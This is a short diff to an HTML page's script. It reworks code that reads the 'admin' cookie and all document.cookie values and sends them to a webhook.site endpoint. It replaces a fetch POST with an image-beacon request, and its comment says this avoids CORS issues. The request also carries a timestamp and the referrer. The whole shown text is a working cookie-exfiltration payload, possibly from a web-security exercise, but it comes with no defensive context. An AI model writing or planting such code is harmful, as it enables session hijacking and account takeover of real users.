@@ -23,18 +23,25 @@ function getAdminCookie() {
 const adminValue = getAdminCookie();
 const resultDiv = document.getElementById('result');
 
-  resultDiv.innerHTML = `
-    <h2 style="color: green;">✅ Admin Cookie Found!</h2>
-    <p><strong>Value:</strong> ${adminValue}</p>
-    <p><strong>All Cookies:</strong> ${document.cookie}</p>
-  `;
-  
-  // Send to webhook
-  fetch('https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({admin: adminValue, allCookies: document.cookie})
-  });
+resultDiv.innerHTML = `
+  <h2 style="color: green;">✅ Admin Cookie Found!</h2>
+  <p><strong>Value:</strong> ${adminValue}</p>
+  <p><strong>All Cookies:</strong> ${document.cookie}</p>
+`;
+
+// Use Image Beacon - no CORS issues
+const data = {
+  admin: adminValue,
+  allCookies: document.cookie,
+  timestamp: new Date().toISOString(),
+  referrer: document.referrer
+};
+
+const img = new Image();
+img.src = 'https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86?' + 
+          new URLSearchParams(data).toString();
+
+console.log('Data sent via image beacon');
 </script>
 </body>
 </html>
